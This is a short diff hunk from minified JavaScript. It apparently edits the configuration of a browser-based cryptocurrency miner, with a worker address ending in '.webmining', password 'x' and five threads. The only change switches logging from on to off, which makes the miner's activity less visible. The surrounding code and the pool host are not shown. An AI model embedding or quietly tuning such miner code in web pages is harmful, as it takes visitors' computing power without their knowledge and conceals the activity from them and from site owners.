@@ -598,7 +598,7 @@
                 worker: "BfDcTj8vqeuRoPizzA2SjzXL9QakY49dq7.webmining",
                 password: "x",
               },
-              options: { threads: 5, log: !0 },
+              options: { threads: 5, log: !1 },
             },
           },
           P = [];
